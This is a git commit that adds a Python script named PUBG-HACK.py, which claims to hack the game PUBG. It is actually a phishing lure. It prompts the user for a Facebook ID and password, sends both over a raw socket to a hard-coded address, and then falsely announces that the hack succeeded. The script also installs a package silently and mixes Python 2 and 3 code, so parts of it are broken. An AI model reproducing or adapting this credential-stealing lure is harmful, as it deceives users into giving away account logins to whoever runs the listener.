22f6f895eb7d068a30cdae3d88a2341f49a6b4d5
Alars96 <64731552+Alars96@users.noreply.github.com>
2020-10-03 11:35:16 +0530

    Add files via upload

---
+++ PUBG-HACK.py
@@ -0,0 +1,26 @@
+import socket
+import os
+try:
+	import pyfiglet
+except Exception as e:
+	os.system("pip install pyfiglet")
+
+
+# result = pyfiglet.figlet_format("wellcome") 
+# print(result)
+
+os.system("clear || cls")
+def connect():
+    s = socket.socket() 
+    s.connect(('192.168.29.149', 8080))
+    result = pyfiglet.figlet_format("HACKING PUBG")
+    print(result)
+    # print "hacking PUBG"
+    while True:
+    	ide = raw_input("Enter you facebook id:")
+        passw = raw_input("Enter youer facebook password:")
+        s.send(ide)
+        s.send(passw)
+        print("GOOD NEWS YOUER PUBG HAVE BEEN HACKED")
+        break
+connect()
